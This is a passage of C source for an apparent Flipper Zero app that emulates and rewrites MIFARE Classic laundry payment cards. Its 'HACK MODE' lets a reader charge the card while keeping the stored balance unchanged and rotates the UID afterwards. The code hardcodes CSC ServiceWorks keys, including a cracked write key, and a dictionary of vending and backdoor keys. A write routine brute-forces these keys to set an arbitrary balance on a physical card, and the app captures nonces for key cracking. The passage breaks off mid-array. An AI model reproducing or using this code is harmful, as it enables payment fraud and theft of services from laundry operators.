        app->widget, 2, 38, AlignLeft, AlignTop, FontSecondary, app->widget_str3);

    snprintf(app->widget_str4, sizeof(app->widget_str4), "Cnt: %u", app->counter);
    widget_add_string_element(
        app->widget, 80, 38, AlignLeft, AlignTop, FontSecondary, app->widget_str4);

    // Transaction stats - moved above OK:Start
    char stats_str[64];
    snprintf(stats_str, sizeof(stats_str), "R:%lu W:%lu Blk:%lu",
        app->reads, app->writes, app->writes_blocked);
    widget_add_string_element(
        app->widget, 2, 46, AlignLeft, AlignTop, FontSecondary, stats_str);

    // Mode indicator at top-right
    const char* mode_str = app->mode == LaundRModeHack ? "HACK" :
                           app->mode == LaundRModeLegit ? "LEGIT" : "INTER";
    snprintf(
        app->widget_str5,
        sizeof(app->widget_str5),
        "%s%s",
        app->has_modifications ? "*" : "",
        mode_str);
    widget_add_string_element(
        app->widget, 128, 0, AlignRight, AlignTop, FontSecondary, app->widget_str5);

    // Show button hints at bottom
    widget_add_string_element(
        app->widget, 2, 54, AlignLeft, AlignTop, FontSecondary, "<:Stats");
    widget_add_string_element(
        app->widget, 128, 54, AlignRight, AlignTop, FontSecondary,
        app->emulating ? "OK:Stop" : "OK:Start");

    // Set input callback to handle OK button (toggle emulation) and Left (stats)
    View* widget_view = widget_get_view(app->widget);
    view_set_input_callback(widget_view, laundr_card_info_input_callback);
    view_set_context(widget_view, app);

    laundr_log_write("About to switch to widget view");
    view_dispatcher_switch_to_view(app->view_dispatcher, LaundRViewWidget);
    laundr_log_write("Switched to widget view successfully");
}

// ============================================================================
// MASTER-KEY AUDIT FUNCTIONS
// ============================================================================

// Create a generic MIFARE Classic 1K card for probing
static void laundr_create_generic_card(LaundRApp* app) {
    laundr_log_write("Creating generic MIFARE Classic 1K structure for Master-Key probing");

    // Clear all blocks
    memset(app->modified_blocks, 0, sizeof(app->modified_blocks));
    memset(app->modified_block_valid, 0, sizeof(app->modified_block_valid));

    // Set up generic blocks for a MIFARE Classic 1K
    for(int sector = 0; sector < 16; sector++) {
        for(int block_in_sector = 0; block_in_sector < 4; block_in_sector++) {
            int block_num = sector * 4 + block_in_sector;

            if(block_in_sector == 3) {
                // Sector trailer with known CSC ServiceWorks Key A
                app->modified_blocks[block_num][0] = 0xEE;  // Key A
                app->modified_blocks[block_num][1] = 0xB7;
                app->modified_blocks[block_num][2] = 0x06;
                app->modified_blocks[block_num][3] = 0xFC;
                app->modified_blocks[block_num][4] = 0x71;
                app->modified_blocks[block_num][5] = 0x4F;

                // Access bits (standard)
                app->modified_blocks[block_num][6] = 0xFF;
                app->modified_blocks[block_num][7] = 0x07;
                app->modified_blocks[block_num][8] = 0x80;
                app->modified_blocks[block_num][9] = 0x69;

                // Key B (unknown - use FF)
                app->modified_blocks[block_num][10] = 0xFF;
                app->modified_blocks[block_num][11] = 0xFF;
                app->modified_blocks[block_num][12] = 0xFF;
                app->modified_blocks[block_num][13] = 0xFF;
                app->modified_blocks[block_num][14] = 0xFF;
                app->modified_blocks[block_num][15] = 0xFF;
            } else if(block_num == 0) {
                // Manufacturer block with generic UID
                app->modified_blocks[0][0] = 0x12;  // Generic UID
                app->modified_blocks[0][1] = 0x34;
                app->modified_blocks[0][2] = 0x56;
                app->modified_blocks[0][3] = 0x78;
                app->modified_blocks[0][4] = 0x12 ^ 0x34 ^ 0x56 ^ 0x78;  // BCC
                app->modified_blocks[0][5] = 0x08;  // SAK
                app->modified_blocks[0][6] = 0x04;  // ATQA
                // Rest zeros
            }
            // All other blocks stay zero

            app->modified_block_valid[block_num] = true;
        }
    }

    // Set generic card info
    snprintf(app->provider, sizeof(app->provider), "Generic Probe");
    snprintf(app->uid, sizeof(app->uid), "12345678");
    app->balance = 0;
    app->counter = 0;
    app->original_balance = 0;
    app->card_loaded = true;  // Mark as "loaded" even though it's generic

    laundr_log_write("Generic card created with CSC ServiceWorks Key A");
}

// Input callback for Master-Key view
static bool laundr_master_key_input_callback(InputEvent* event, void* context) {
    LaundRApp* app = context;

    if(event->type == InputTypeShort && event->key == InputKeyOk) {
        // Toggle emulation
        if(app->emulating) {
            laundr_stop_emulation(app);
        } else {
            laundr_start_emulation(app);
        }
        // Refresh the Master-Key display
        laundr_show_master_key_audit(app);
        return true;
    }

    return false;
}

// Update Master-Key widget with current progress
static void laundr_update_master_key_progress(LaundRApp* app) {
    if(!app || !app->master_key_widget) return;

    widget_reset(app->master_key_widget);

    // ═══════════════════════════════════════════════════════
    // MASTER-KEY AUDIT MODE - DISTINCTIVE VISUAL DESIGN
    // ═══════════════════════════════════════════════════════

    // Top banner with frame
    widget_add_string_element(
        app->master_key_widget, 1, 0, AlignLeft, AlignTop, FontSecondary, "========================");
    widget_add_string_element(
        app->master_key_widget, 64, 8, AlignCenter, AlignTop, FontPrimary, "MASTER-KEY AUDIT");
    widget_add_string_element(
        app->master_key_widget, 1, 16, AlignLeft, AlignTop, FontSecondary, "========================");

    // Status indicator (large and centered)
    if(!app->interrogation_active && app->interrogation.total_operations > 0) {
        widget_add_string_element(
            app->master_key_widget, 64, 26, AlignCenter, AlignTop, FontPrimary, "COMPLETE");
        snprintf(app->mk_status, sizeof(app->mk_status), "%lu operations logged", app->interrogation.total_operations);
        widget_add_string_element(
            app->master_key_widget, 64, 36, AlignCenter, AlignTop, FontSecondary, app->mk_status);
    } else if(app->emulating) {
        widget_add_string_element(
            app->master_key_widget, 64, 26, AlignCenter, AlignTop, FontPrimary, ">> ANALYZING <<");

        // Operations counter
        snprintf(app->mk_progress, sizeof(app->mk_progress), "Operations: %lu", app->interrogation.total_operations);
        widget_add_string_element(
            app->master_key_widget, 64, 36, AlignCenter, AlignTop, FontSecondary, app->mk_progress);

        // Reads counter
        snprintf(app->mk_config, sizeof(app->mk_config), "Reads: %lu", app->reads);
        widget_add_string_element(
            app->master_key_widget, 64, 44, AlignCenter, AlignTop, FontSecondary, app->mk_config);
    } else {
        widget_add_string_element(
            app->master_key_widget, 64, 26, AlignCenter, AlignTop, FontPrimary, "--- READY ---");
        widget_add_string_element(
            app->master_key_widget, 64, 36, AlignCenter, AlignTop, FontSecondary, "Press OK to scan");
    }

    // Bottom instruction bar
    widget_add_string_element(
        app->master_key_widget, 1, 54, AlignLeft, AlignTop, FontSecondary, "------------------------");
    if(app->emulating) {
        widget_add_string_element(
            app->master_key_widget, 64, 60, AlignCenter, AlignTop, FontSecondary, "OK:Stop | TAP TO READER");
    } else {
        widget_add_string_element(
            app->master_key_widget, 64, 60, AlignCenter, AlignTop, FontSecondary, "OK:Start | BACK:Exit");
    }
}

// Show Master-Key audit screen
static void laundr_show_master_key_audit(LaundRApp* app) {
    laundr_update_master_key_progress(app);

    // Set input callback
    View* mk_view = widget_get_view(app->master_key_widget);
    view_set_input_callback(mk_view, laundr_master_key_input_callback);
    view_set_context(mk_view, app);
    view_set_previous_callback(mk_view, laundr_back_to_submenu_callback);

    view_dispatcher_switch_to_view(app->view_dispatcher, LaundRViewMasterKey);
    laundr_log_write("Switched to Master-Key audit view");
}

static void laundr_stop_emulation(LaundRApp* app) {
    laundr_log_write(">>> laundr_stop_emulation() called");

    if(!app) {
        laundr_log_write("ERROR: app is NULL!");
        return;
    }

    laundr_log_write("App valid, emulating flag is: %d", app->emulating);
    laundr_log_write("Checking listener pointer: %p", (void*)app->nfc_listener);

    // Check the listener pointer, not the corrupted flag!
    if(!app->nfc_listener) {
        laundr_log_write("NO LISTENER - nothing to stop");
        app->emulating = false;
        return;
    }

    laundr_log_write("Active listener found, stopping now...");
    FURI_LOG_I(TAG, "Stopping NFC listener");

    // CRITICAL: Stop listener first, then free it, BEFORE touching nfc/device
    // Add defensive checks to prevent crashes
    laundr_log_write("Calling nfc_listener_stop()...");
    if(app->nfc_listener) {
        // Try to stop the listener - this should be safe even if already stopped
        laundr_log_write("About to call nfc_listener_stop (listener=%p)", (void*)app->nfc_listener);
        nfc_listener_stop(app->nfc_listener);
        laundr_log_write("nfc_listener_stop() returned successfully");

        // Now free the listener
        laundr_log_write("About to call nfc_listener_free (listener=%p)", (void*)app->nfc_listener);
        nfc_listener_free(app->nfc_listener);
        laundr_log_write("nfc_listener_free() returned successfully");

        app->nfc_listener = NULL;
        laundr_log_write("Listener pointer set to NULL");
    } else {
        laundr_log_write("WARNING: Listener was NULL in double-check, skipping stop/free");
    }

    // Clear flag immediately after stopping listener
    laundr_log_write("Setting emulating flag to false");
    app->emulating = false;

    // Save any captured MFKey nonces to log file
    if(app->mfkey_pairs_complete > 0) {
        laundr_log_write("MFKey: Saving %zu complete nonce pairs", app->mfkey_pairs_complete);
        if(laundr_mfkey_save_nonces(app)) {
            laundr_log_write("MFKey: Nonces saved! Run NFC->MFKey32 to crack keys");
        }
        laundr_mfkey_reset(app);  // Clear for next session
    } else if(app->mfkey_nonce_count > 0) {
        laundr_log_write("MFKey: %zu partial nonces (need more auth attempts)", app->mfkey_nonce_count);
    }
    app->mfkey_capture_enabled = false;

    // DON'T free NFC instance or device - they might be needed for next emulation
    // Just leave them allocated for reuse
    laundr_log_write("Keeping NFC instance and device allocated for reuse");

    // Stop LED notification
    laundr_log_write("Stopping LED blink");
    if(app->notifications) {
        notification_message(app->notifications, &sequence_blink_stop);
    }

    // CRITICAL: Copy LISTENER's data back BEFORE freeing the listener!
    // The listener has its own internal copy that the reader modified
    // app->mfc_data is our ORIGINAL data - never modified by reader
    if(app->nfc_listener) {
        const MfClassicData* listener_data = (const MfClassicData*)nfc_listener_get_data(
            app->nfc_listener, NfcProtocolMfClassic);
        if(listener_data) {
            laundr_log_write("Copying LISTENER data back (this has reader's modifications)...");
            for(int block = 0; block < 64; block++) {
                if(app->emulation_block_valid[block]) {
                    memcpy(app->emulation_blocks[block], listener_data->block[block].data, 16);
                }
            }
        } else {
            laundr_log_write("WARNING: Could not get listener data!");
        }
    } else if(app->mfc_data) {
        laundr_log_write("No listener - copying from mfc_data (original, not modified)...");
        for(int block = 0; block < 64; block++) {
            if(app->emulation_block_valid[block]) {
                memcpy(app->emulation_blocks[block], app->mfc_data->block[block].data, 16);
            }
        }
    }

    // HACK MODE: Check for balance changes and silently don't save them
    if(app->mode == LaundRModeHack) {
        // Parse balance from emulation blocks (what the reader wrote)
        uint16_t emulated_balance = 0;
        bool emulated_valid = false;

        if(app->emulation_block_valid[4]) {
            uint8_t* block = app->emulation_blocks[4];
            uint16_t bal = (uint16_t)block[0] | ((uint16_t)block[1] << 8);
            uint16_t bal_inv = (uint16_t)block[4] | ((uint16_t)block[5] << 8);

            if((bal ^ bal_inv) == 0xFFFF) {
                emulated_balance = bal;
                emulated_valid = true;
            }
        }

        // Parse original balance from modified blocks
        uint16_t original_balance = 0;
        bool original_valid = false;

        if(app->modified_block_valid[4]) {
            uint8_t* block = app->modified_blocks[4];
            uint16_t bal = (uint16_t)block[0] | ((uint16_t)block[1] << 8);
            uint16_t bal_inv = (uint16_t)block[4] | ((uint16_t)block[5] << 8);

            if((bal ^ bal_inv) == 0xFFFF) {
                original_balance = bal;
                original_valid = true;
            }
        }

        // Check if balance changed (decreased = charge)
        if(emulated_valid && original_valid && emulated_balance != original_balance) {
            int32_t change = (int32_t)emulated_balance - (int32_t)original_balance;

            if(change < 0) {
                // Balance decreased - we got charged!
                app->last_charge_amount = (int16_t)change;  // Store charge amount

                laundr_log_transaction("");
                laundr_log_transaction("╔═══════════════════════════════════════════════╗");
                laundr_log_transaction("║        HACK MODE: CHARGE NOT PERSISTED        ║");
                laundr_log_transaction("╚═══════════════════════════════════════════════╝");
                laundr_log_transaction("Reader charged successfully: -$%.2f", (double)(-change) / 100);
                laundr_log_transaction("Reader saw balance drop: $%.2f → $%.2f", (double)original_balance / 100, (double)emulated_balance / 100);
                laundr_log_transaction("File balance: $%.2f (UNCHANGED)", (double)original_balance / 100);
                laundr_log_transaction("");
                laundr_log_transaction("Reader thinks transaction succeeded...");
                laundr_log_transaction("lol, nah.");
                laundr_log_transaction("");

                app->writes_blocked++;

                // Show popup to user
                popup_reset(app->popup);
                popup_set_header(app->popup, "HACK MODE", 64, 10, AlignCenter, AlignTop);

                // Create popup message
                char popup_msg[128];
                snprintf(popup_msg, sizeof(popup_msg),
                         "Reader charged -$%.2f\n\nlol, nah. 😎\n\nFile unchanged!",
                         (double)(-change) / 100);

                popup_set_text(app->popup, popup_msg, 64, 30, AlignCenter, AlignTop);
                popup_set_timeout(app->popup, 3000);
                popup_set_context(app->popup, app);
                popup_set_callback(app->popup, NULL);
                popup_enable_timeout(app->popup);
                view_dispatcher_switch_to_view(app->view_dispatcher, LaundRViewPopup);

                // DON'T copy emulation blocks back - keep original balance
            } else {
                // Balance increased (credit added) - allow it even in hack mode
                app->last_charge_amount = (int16_t)change;  // Store credit amount
                laundr_log_transaction("Balance increased by $%.2f - allowing change", (double)change / 100);
                memcpy(app->modified_blocks[4], app->emulation_blocks[4], 16);
                if(app->emulation_block_valid[8]) {
                    memcpy(app->modified_blocks[8], app->emulation_blocks[8], 16);
                }
            }

            // Rotate UID after ANY balance change (charge or credit)
            if(app->emulating && app->mfc_data) {
                laundr_rotate_uid(app);
            }
        }
    } else if(app->mode == LaundRModeLegit) {
        // LEGIT MODE: Copy all changes from emulation blocks to modified blocks
        laundr_log_write("LEGIT MODE: Syncing emulation changes to card data");
        for(int i = 0; i < 64; i++) {
            if(app->emulation_block_valid[i]) {
                memcpy(app->modified_blocks[i], app->emulation_blocks[i], 16);
            }
        }
        // Re-parse balance from modified blocks
        laundr_parse_balance(app);
    }

    // Log emulation stop with stats - to both logs
    laundr_log_transaction("=== EMULATION STOPPED ===");
    laundr_log_transaction("Total Reads: %lu", app->reads);
    laundr_log_transaction("Total Writes: %lu", app->writes);
    laundr_log_transaction("Writes Blocked: %lu", app->writes_blocked);
    laundr_log_transaction("Transactions: %lu", app->transaction_count);
    laundr_log_system("=== EMULATION STOPPED === Reads=%lu Writes=%lu Txns=%lu",
        app->reads, app->writes, app->transaction_count);

    // Write transaction summary to CSV database (deferred from timer callback)
    // This runs in main context with full stack, safe for file I/O
    if(app->transaction_count > 0 && app->mode == LaundRModeHack) {
        uint32_t total_block_writes = 0;
        for(int i = 0; i < 64; i++) {
            total_block_writes += app->block_write_count[i];
        }

        // Write one entry per transaction (using last charge as representative)
        laundr_log_transaction_csv(
            app->transaction_count,
            app->uid,
            app->provider,
            app->balance,  // Original balance
            (uint16_t)(app->balance + app->last_charge_amount),  // Balance after last charge
            app->last_charge_amount,
            "HACK",
            total_block_writes,
            app->reads,
            app->writes);
        laundr_log_transaction("CSV database updated with session transactions");
    }

    // DEEP LOGGING SUMMARY - which blocks were accessed
    laundr_log_transaction("");
    laundr_log_transaction("╔═══════════════════════════════════════════════╗");
    laundr_log_transaction("║  BLOCK ACCESS SUMMARY                         ║");
    laundr_log_transaction("╠═══════════════════════════════════════════════╣");
    bool any_writes = false;
    for(int block = 0; block < 64; block++) {
        if(app->block_write_count[block] > 0) {
            any_writes = true;
            laundr_log_transaction("║  Block %02d (Sector %d): %lu writes",
                block, block / 4, app->block_write_count[block]);
        }
    }
    if(!any_writes) {
        laundr_log_transaction("║  No block writes detected                     ║");
    }
    laundr_log_transaction("╚═══════════════════════════════════════════════╝");
    laundr_log_transaction("");

    // INTERROGATION MODE: Generate discovery report
    if(app->mode == LaundRModeInterrogate) {
        laundr_log_transaction("");
        laundr_log_transaction("╔═══════════════════════════════════════════════╗");
        laundr_log_transaction("║     INTERROGATION MODE - FINAL REPORT         ║");
        laundr_log_transaction("╚═══════════════════════════════════════════════╝");
        laundr_log_transaction("");
        laundr_log_transaction("Total NFC operations: %lu", app->interrogation.total_operations);
        laundr_log_transaction("Total reads: %lu", app->reads);
        laundr_log_transaction("Total writes: %lu", app->writes);
        laundr_log_transaction("");
        laundr_log_transaction("Check logs above for detailed reader interaction patterns");

        laundr_log_transaction("");
        laundr_log_transaction("═══════════════════════════════════════════════");
        laundr_log_transaction("");
    }

    FURI_LOG_I(TAG, "Listener stopped");
    laundr_log_system("<<< laundr_stop_emulation() complete");
}

// ============================================================================
// WRITE TO CARD FUNCTIONS
// ============================================================================

static bool laundr_write_input_callback(InputEvent* event, void* context) {
    LaundRApp* app = context;

    if(event->type == InputTypeShort && event->key == InputKeyBack) {
        // Cancel write operation
        app->write_in_progress = false;
        app->write_state = 0;  // Idle
        view_dispatcher_switch_to_view(app->view_dispatcher, LaundRViewSubmenu);
        return true;
    }

    return false;
}

static void laundr_write_to_card(LaundRApp* app) {
    if(!app->card_loaded) {
        laundr_log_system("Write to Card failed: no card loaded");
        return;
    }

    laundr_log_system(">>> Write to Card initiated");
    laundr_log_transaction("");
    laundr_log_transaction("======================================");
    laundr_log_transaction("       WRITE TO CARD INITIATED        ");
    laundr_log_transaction("======================================");

    // Stop any ongoing emulation first
    if(app->emulating) {
        laundr_stop_emulation(app);
    }

    // CRITICAL: Free any existing NFC instance before allocating a new one
    // The Flipper only has one NFC peripheral - having two instances causes bus fault
    if(app->nfc) {
        laundr_log_system("Write: Freeing existing app->nfc before allocation");
        nfc_free(app->nfc);
        app->nfc = NULL;
    }

    // Get balance from modified blocks for logging
    uint16_t balance = (uint16_t)app->modified_blocks[4][0] | ((uint16_t)app->modified_blocks[4][1] << 8);

    // Show waiting screen
    widget_reset(app->widget);
    widget_add_string_element(app->widget, 64, 5, AlignCenter, AlignTop, FontPrimary, "Write to Card");
    widget_add_string_element(app->widget, 64, 20, AlignCenter, AlignTop, FontSecondary, "Place CSC card on");
    widget_add_string_element(app->widget, 64, 32, AlignCenter, AlignTop, FontSecondary, "back of Flipper");

    char balance_str[32];
    snprintf(balance_str, sizeof(balance_str), "Writing: $%.2f", (double)balance / 100);
    widget_add_string_element(app->widget, 64, 48, AlignCenter, AlignTop, FontSecondary, balance_str);
    widget_add_string_element(app->widget, 64, 58, AlignCenter, AlignTop, FontSecondary, "Waiting for card...");

    View* widget_view = widget_get_view(app->widget);
    view_set_input_callback(widget_view, laundr_write_input_callback);
    view_set_context(widget_view, app);

    view_dispatcher_switch_to_view(app->view_dispatcher, LaundRViewWidget);

    // Start orange LED blink to indicate write mode waiting for card
    if(app->notifications) {
        notification_message(app->notifications, &sequence_blink_orange);
    }

    // Allocate NFC instance for write operation
    Nfc* nfc = nfc_alloc();
    if(!nfc) {
        laundr_log_system("Write to Card failed: could not allocate NFC");
        widget_reset(app->widget);
        widget_add_string_element(app->widget, 64, 30, AlignCenter, AlignTop, FontPrimary, "NFC Error!");
        widget_add_string_element(app->widget, 64, 50, AlignCenter, AlignTop, FontSecondary, "Press BACK");
        return;
    }

    // Known laundry/vending MIFARE keys from security research
    // Sources: Proxmark3 dictionaries, MifareClassicTool, Flipper community
    static const MfClassicKey known_keys[] = {
        // Default MIFARE keys
        {{0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}},  // Default key
        {{0x00, 0x00, 0x00, 0x00, 0x00, 0x00}},  // Blank key
        {{0xA0, 0xA1, 0xA2, 0xA3, 0xA4, 0xA5}},  // MAD key A
        {{0xB0, 0xB1, 0xB2, 0xB3, 0xB4, 0xB5}},  // MAD key B
        {{0xD3, 0xF7, 0xD3, 0xF7, 0xD3, 0xF7}},  // Common default

        // CSC ServiceWorks Keys
        {{0xEE, 0xB7, 0x06, 0xFC, 0x71, 0x4F}},  // CSC Key A (read)
        {{0xF4, 0xF7, 0xD6, 0x87, 0xDB, 0x0B}},  // CSC Key B (write) - MFKey32 cracked

        // Laundry/Cleaning Service keys (from Proxmark3 dictionary)
        {{0x07, 0x34, 0xBF, 0xB9, 0x3D, 0xAB}},  // Laundry 1
        {{0x85, 0xA4, 0x38, 0xF7, 0x2A, 0x8A}},  // Laundry 2
        {{0x21, 0x22, 0x23, 0x24, 0x25, 0x55}},  // Laundry 3
        {{0x71, 0x72, 0x73, 0x74, 0x75, 0x55}},  // Laundry 4
        {{0x29, 0x1A, 0x65, 0xCB, 0xEA, 0x7B}},  // Laundry 5
        {{0x34, 0x4A, 0x35, 0x9B, 0xBA, 0xD9}},  // Laundry 6
        {{0x47, 0x65, 0x72, 0x72, 0x61, 0x72}},  // "Gerrar" laundry
        {{0x4D, 0x69, 0x63, 0x68, 0x65, 0x6C}},  // "Michel" laundry
        {{0x4F, 0x37, 0x48, 0xE6, 0xC8, 0x26}},  // Laundry 9
        {{0x69, 0xD4, 0x0A, 0xF8, 0xB3, 0x53}},  // Laundry 10
        {{0x72, 0xDE, 0xA1, 0x0F, 0x21, 0xDF}},  // Laundry 11
        {{0x74, 0x84, 0x5A, 0xA8, 0xE3, 0xF1}},  // Laundry 12
        {{0x8C, 0x3C, 0x43, 0xED, 0xCC, 0x55}},  // Laundry 13
        {{0xAC, 0xD3, 0x0D, 0xFF, 0xB4, 0x34}},  // Laundry 14
        {{0xD1, 0xA2, 0x7C, 0x8E, 0xC5, 0xDF}},  // Laundry 15
        {{0xF1, 0x4D, 0x32, 0x9C, 0xBD, 0xBE}},  // Laundry 16

        // Catering/Vending keys
        {{0x6A, 0x0D, 0x53, 0x1D, 0xA1, 0xA7}},  // Catering 1
        {{0x4B, 0xB2, 0x94, 0x63, 0xDC, 0x29}},  // Catering 2
        {{0x86, 0x27, 0xC1, 0x0A, 0x70, 0x14}},  // Swim/Wellness 1
        {{0x45, 0x38, 0x57, 0x39, 0x56, 0x35}},  // Swim/Wellness 2

        // MIFARE Classic clone backdoor keys (Fudan, etc.)
        {{0xA3, 0x96, 0xEF, 0xA4, 0xE2, 0x4F}},  // Fudan backdoor (static encrypted)
        {{0xA3, 0x16, 0x67, 0xA8, 0xCE, 0xC1}},  // Fudan/Infineon/NXP backdoor
        {{0x51, 0x8B, 0x33, 0x54, 0xE7, 0x60}},  // Fudan backdoor 2

        // Common vending machine keys
        {{0xAA, 0xFB, 0x06, 0x04, 0x58, 0x77}},  // Vending 1
        {{0xE0, 0x00, 0x00, 0x00, 0x00, 0x00}},  // Vending 2
        {{0xE7, 0xD6, 0x06, 0x4C, 0x58, 0x60}},  // Vending 3
        {{0xB2, 0x7C, 0xCA, 0xB3, 0x0D, 0xBD}},  // Vending 4
    };
    static const size_t num_keys = sizeof(known_keys) / sizeof(known_keys[0]);

    // Note: CSC key and default key are included in known_keys array above

    // Prepare blocks to write
    MfClassicBlock block4, block8;
    memcpy(block4.data, app->modified_blocks[4], 16);
    memcpy(block8.data, app->modified_blocks[8], 16);

    app->write_in_progress = true;
    app->write_state = 1;  // Waiting for card

    laundr_log_transaction("Waiting for card...");
    laundr_log_transaction("Writing balance: $%.2f (%d cents)", (double)balance / 100, balance);

    // First, wait for card to be present by trying to read with known keys
    MfClassicError error = MfClassicErrorNotPresent;
    MfClassicBlock test_block;
    int max_retries = 100;  // ~10 seconds of waiting
    int retry = 0;

    // Wait for card presence using read (try multiple keys)
    while(retry < max_retries && app->write_in_progress) {
        // Try default key first (fastest), then CSC key
        for(size_t k = 0; k < 6 && error != MfClassicErrorNone; k++) {
            MfClassicKey detect_key;
            memcpy(&detect_key, &known_keys[k], sizeof(MfClassicKey));
            error = mf_classic_poller_sync_read_block(
                nfc, 0, &detect_key, MfClassicKeyTypeA, &test_block);
        }

        if(error == MfClassicErrorNone) {
            laundr_log_transaction("Card detected, attempting write...");
            break;  // Card found!
        }

        if(error != MfClassicErrorNotPresent && error != MfClassicErrorTimeout) {
            break;  // Real error
        }

        furi_delay_ms(100);
        retry++;
    }

    if(error != MfClassicErrorNone) {
        nfc_free(nfc);
        app->write_in_progress = false;
        laundr_log_transaction("No card found after waiting");

        // Stop orange LED and show red for timeout
        if(app->notifications) {
            notification_message(app->notifications, &sequence_solid_red);
        }

        widget_reset(app->widget);
        widget_add_string_element(app->widget, 64, 20, AlignCenter, AlignTop, FontPrimary, "No Card Found");
        widget_add_string_element(app->widget, 64, 40, AlignCenter, AlignTop, FontSecondary, "Timed out waiting");
        widget_add_string_element(app->widget, 64, 55, AlignCenter, AlignTop, FontSecondary, "Press BACK");
        view_dispatcher_switch_to_view(app->view_dispatcher, LaundRViewWidget);
        return;
    }

    // Card is present - now try to write block 4
    // Try ALL known laundry/vending keys with both Key A and Key B
    bool write_success = false;
    size_t successful_key_idx = 0;
    MfClassicKeyType successful_key_type = MfClassicKeyTypeA;

    laundr_log_transaction("Trying %zu known keys...", num_keys);

    // Try each key as both Key B (most likely for writes) and Key A
    for(size_t k = 0; k < num_keys && !write_success; k++) {
        // Try Key B first (usually used for writes)
        MfClassicKey key_copy;
        memcpy(&key_copy, &known_keys[k], sizeof(MfClassicKey));

        error = mf_classic_poller_sync_write_block(
            nfc, 4, &key_copy, MfClassicKeyTypeB, &block4);

        if(error == MfClassicErrorNone) {
            laundr_log_transaction("Block 4 written with key[%zu] as KeyB", k);
            write_success = true;
            successful_key_idx = k;
            successful_key_type = MfClassicKeyTypeB;
            break;
        }

        // Try Key A
        error = mf_classic_poller_sync_write_block(
            nfc, 4, &key_copy, MfClassicKeyTypeA, &block4);

        if(error == MfClassicErrorNone) {
            laundr_log_transaction("Block 4 written with key[%zu] as KeyA", k);
            write_success = true;
            successful_key_idx = k;
            successful_key_type = MfClassicKeyTypeA;
            break;
        }
    }

    if(!write_success) {
        laundr_log_transaction("All %zu keys failed for block 4", num_keys);
        error = MfClassicErrorProtocol;
    }

    if(error != MfClassicErrorNone) {
        // Write failed
        nfc_free(nfc);
        app->write_in_progress = false;
        app->write_state = 4;  // Error

        const char* error_msg = "Unknown error";
        switch(error) {
            case MfClassicErrorNotPresent: error_msg = "Card not found"; break;
            case MfClassicErrorProtocol: error_msg = "Protocol error"; break;
            case MfClassicErrorAuth: error_msg = "Auth failed"; break;
            case MfClassicErrorTimeout: error_msg = "Timeout"; break;
            default: error_msg = "Write failed"; break;
        }

        laundr_log_transaction("ERROR writing Block 4: %s", error_msg);
        laundr_log_system("Write to Card FAILED: %s", error_msg);

        // Red LED + double vibro for write failure
        if(app->notifications) {
            notification_message(app->notifications, &sequence_solid_red);
        }

        // Show error
        widget_reset(app->widget);
        widget_add_string_element(app->widget, 64, 20, AlignCenter, AlignTop, FontPrimary, "Write Failed!");
        widget_add_string_element(app->widget, 64, 40, AlignCenter, AlignTop, FontSecondary, error_msg);
        widget_add_string_element(app->widget, 64, 55, AlignCenter, AlignTop, FontSecondary, "Press BACK");

        view_dispatcher_switch_to_view(app->view_dispatcher, LaundRViewWidget);
        return;
    }

    // Block 4 written successfully, now write block 8 (backup balance)
    // Use the same key that worked for block 4
    laundr_log_transaction("Block 4 written! Using same key for block 8...");
    app->write_state = 2;  // Writing

    MfClassicKey successful_key;
    memcpy(&successful_key, &known_keys[successful_key_idx], sizeof(MfClassicKey));

    error = mf_classic_poller_sync_write_block(
        nfc, 8, &successful_key, successful_key_type, &block8);

    write_success = (error == MfClassicErrorNone);

    if(write_success) {
        laundr_log_transaction("Block 8 written with same key");
    } else {
        // Try all keys for block 8 (different sector may have different key)
        for(size_t k = 0; k < num_keys && !write_success; k++) {
            MfClassicKey key_copy;
            memcpy(&key_copy, &known_keys[k], sizeof(MfClassicKey));

            error = mf_classic_poller_sync_write_block(
                nfc, 8, &key_copy, MfClassicKeyTypeB, &block8);
            if(error == MfClassicErrorNone) {
                write_success = true;
                break;
            }

            error = mf_classic_poller_sync_write_block(
                nfc, 8, &key_copy, MfClassicKeyTypeA, &block8);
            if(error == MfClassicErrorNone) {
                write_success = true;
                break;
            }
        }
    }

    if(!write_success) {
        // Block 8 write failed (but block 4 succeeded)
        nfc_free(nfc);
        laundr_log_transaction("WARNING: Block 8 write failed (Block 4 OK)");
        laundr_log_system("Write to Card partial: Block 4 OK, Block 8 failed");

        widget_reset(app->widget);
        widget_add_string_element(app->widget, 64, 10, AlignCenter, AlignTop, FontPrimary, "Partial Write");
        widget_add_string_element(app->widget, 64, 25, AlignCenter, AlignTop, FontSecondary, "Block 4 OK");
        widget_add_string_element(app->widget, 64, 37, AlignCenter, AlignTop, FontSecondary, "Block 8 FAILED");

        snprintf(app->widget_str1, sizeof(app->widget_str1), "$%.2f written", (double)balance / 100);
        widget_add_string_element(app->widget, 64, 52, AlignCenter, AlignTop, FontSecondary, app->widget_str1);

        view_dispatcher_switch_to_view(app->view_dispatcher, LaundRViewWidget);

        app->write_in_progress = false;
        app->write_state = 3;  // Done (partial)
        return;
    }

    // Both blocks written successfully!
    nfc_free(nfc);
    app->write_in_progress = false;
    app->write_state = 3;  // Done

    laundr_log_transaction("Block 8 written successfully");
    laundr_log_transaction("======================================");
    laundr_log_transaction("      WRITE TO CARD COMPLETE!         ");
    laundr_log_transaction("======================================");
    laundr_log_transaction("Balance written: $%.2f", (double)balance / 100);
    laundr_log_system("Write to Card SUCCESS: $%.2f", (double)balance / 100);

    // Show success
    widget_reset(app->widget);
    widget_add_string_element(app->widget, 64, 10, AlignCenter, AlignTop, FontPrimary, "Write Complete!");

    snprintf(app->widget_str1, sizeof(app->widget_str1), "$%.2f written", (double)balance / 100);
    widget_add_string_element(app->widget, 64, 30, AlignCenter, AlignTop, FontSecondary, app->widget_str1);
    widget_add_string_element(app->widget, 64, 45, AlignCenter, AlignTop, FontSecondary, "Blocks 4 & 8 OK");
    widget_add_string_element(app->widget, 64, 58, AlignCenter, AlignTop, FontSecondary, "Press BACK");

    view_dispatcher_switch_to_view(app->view_dispatcher, LaundRViewWidget);

    // Green LED + vibro for write success
    if(app->notifications) {
        notification_message(app->notifications, &sequence_solid_green);
    }
}

// ============================================================================
// TEST CARD KEYS FUNCTION - Interrogate card with all known keys
// ============================================================================

static void laundr_test_card_keys(LaundRApp* app) {
    laundr_log_system(">>> Test Card Keys initiated");

    // Known laundry/vending MIFARE keys (same as write function)
    static const MfClassicKey test_keys[] = {
        {{0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}},  // Default
